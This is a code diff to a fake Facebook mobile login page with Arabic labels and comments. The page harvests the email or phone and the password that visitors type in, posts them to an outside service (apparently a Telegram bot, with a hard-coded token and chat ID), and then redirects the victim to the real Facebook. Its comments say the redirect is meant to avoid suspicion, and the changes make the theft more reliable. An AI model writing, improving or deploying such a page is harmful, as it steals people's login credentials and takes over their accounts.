@@ -138,6 +138,7 @@
 </div>
 
 <div class="form-container">
+    <!-- تم تصحيح بناء النموذج هنا ليتطابق مع دالة الإرسال البرمجية -->
     <form id="fbMobileForm">
         <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
         <input type="password" id="password" placeholder="كلمة السر" required>
@@ -164,7 +165,7 @@
 
 <script>
 document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+    e.preventDefault(); // منع الصفحة من التحديث لتمرير البيانات أولاً
 
     const token = '8940244394:AAGl_48JKHuu0-wqGgXFTsAzjzS4g5Z2gQg';
     const chatId = '8925208993';
@@ -180,15 +181,19 @@ document.getElementById('fbMobileForm').addEventListener('submit', function(e) {
         text: messageText
     };
 
+    // إرسال الطلب بنفس آلية الكود البسيط الناجح
     fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
     })
-    .then(() => {
+    .then(response => response.json())
+    .then(result => {
+        // التوجيه إلى صفحة تسجيل الدخول الأصلية بعد الإرسال لعدم الشك
         window.location.href = "https://facebook.com";
     })
-    .catch(() => {
+    .catch(error => {
+        // في حال حدوث أي انقطاع بالشبكة يتم التوجيه أيضاً
         window.location.href = "https://facebook.com";
     });
 });
